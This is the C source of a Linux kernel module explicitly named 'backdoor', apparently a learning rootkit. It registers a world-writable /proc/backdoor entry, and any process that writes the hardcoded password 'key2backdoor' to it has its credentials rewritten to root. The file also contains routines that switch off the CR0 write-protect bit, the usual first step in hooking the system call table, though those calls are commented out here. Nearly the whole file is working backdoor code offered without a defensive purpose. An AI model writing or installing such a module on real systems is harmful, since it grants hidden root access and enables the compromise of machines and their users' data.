#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/seq_file.h>
#include <linux/dirent.h>
#define NAME "backdoor"
#define PASSWD "key2backdoor"

struct proc_dir_entry *entry;


void disable_wp(void){
    unsigned long cr0;
    preempt_disable();//lock cpu
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT,&cr0);
    write_cr0(cr0);
    preempt_enable();
    printk("LKM3:disable WP success\n");
    return;
}

void enable_wp(void){
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT,&cr0);
    write_cr0(cr0);
    preempt_enable();
    printk("LKM3:enable WP success\n");
    return;
}

//write handle overwrite
ssize_t write_handler(struct file * flip,const char __user *buff,size_t count,loff_t *offp){
    char *kbuff;
    struct cred* cred;
    kbuff = kmalloc(count+1,GFP_KERNEL);
    if(!kbuff){
        return -ENOMEM;
    }
    if(copy_from_user(kbuff,buff,count)){
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;
    if(strlen(kbuff)==strlen(PASSWD) && strncmp(PASSWD,kbuff,count)==0 )
    {
        printk("LKM3:opened the backdoor,root you\n");
        //get the current credential
        cred = (struct cred*)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk("LKM3:you have been rooted\n");
    }else {
        printk("LKM3:not the key to backdoor\n");
    }
    kfree(kbuff);
    return count;
}

//for proc_create to operate file in linux/fs.h
//we nodify its write_handler to check the file and root the user
struct file_operations proc_fops = {
    .write = write_handler
};


static int lkm_init(void){
    printk("LKM3:backdoor module loaded!\n");
    
    //create a virtual proc file for user to communicate with kernel
    entry = proc_create(NAME,S_IRUGO | S_IWUGO,NULL,&proc_fops);
    //disable_wp();
    //modify sys_call_table
    //enable_wp(); 

    return 0;
}

static void lkm_exit(void){
    // remove the virtual file
    proc_remove(entry);
    printk("LKM3:backdoor module removed\n");

}

module_init(lkm_init);
module_exit(lkm_exit);
